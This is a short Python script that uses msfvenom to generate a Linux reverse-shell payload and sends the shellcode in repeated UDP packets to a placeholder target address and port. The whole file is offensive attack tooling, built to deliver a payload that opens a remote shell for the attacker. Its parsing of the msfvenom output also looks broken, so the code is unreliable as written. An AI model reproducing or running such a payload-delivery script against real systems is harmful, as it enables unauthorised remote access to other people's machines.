import os
import socket
import time
from scapy.all import IP, UDP, send

def generate_shellcode():
    # Using msfvenom to generate shellcode
    command = "msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python"
    result = os.popen(command).read()
    shellcode = result.split('buf = ')[1].strip().replace('\n', '').replace('\"', '').replace('+', '')
    return bytes.fromhex(shellcode.replace('\\x', ''))

def send_shellcode_via_udp(shellcode, target_ip, target_port, num_packets, burst_interval):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(num_packets):
        try:
            sock.sendto(shellcode, (target_ip, target_port))
            print(f"Packet {i+1}/{num_packets} sent to {target_ip}:{target_port}")
            time.sleep(burst_interval)
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    sock.close()

if __name__ == "__main__":
    target_ip = "192.168.1.100"  # Replace with the target IP
    target_port = 4444  # Replace with the target port
    num_packets = 10  # Number of packets to send
    burst_interval = 1  # Interval between packets in seconds

    shellcode = generate_shellcode()
    send_shellcode_via_udp(shellcode, target_ip, target_port, num_packets, burst_interval)
